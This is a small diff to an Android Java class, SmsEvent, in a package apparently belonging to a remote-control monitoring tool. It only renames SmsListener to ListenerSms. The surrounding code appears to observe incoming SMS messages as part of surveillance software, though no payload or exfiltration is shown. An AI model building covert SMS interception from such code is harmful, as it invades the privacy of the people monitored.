@@ -6,7 +6,7 @@ import android.util.Log;
 
 import com.ht.RCSAndroidGUI.Sms;
 import com.ht.RCSAndroidGUI.interfaces.Observer;
-import com.ht.RCSAndroidGUI.listener.SmsListener;
+import com.ht.RCSAndroidGUI.listener.ListenerSms;
 import com.ht.RCSAndroidGUI.util.DataBuffer;
 import com.ht.RCSAndroidGUI.util.WChar;
 
@@ -19,12 +19,12 @@ public class SmsEvent extends EventBase implements Observer<Sms> {
 	
 	@Override
 	public void begin() {
-		SmsListener.self().attach(this);
+		ListenerSms.self().attach(this);
 	}
 
 	@Override
 	public void end() {
-		SmsListener.self().detach(this);
+		ListenerSms.self().detach(this);
 	}
 
 	@Override
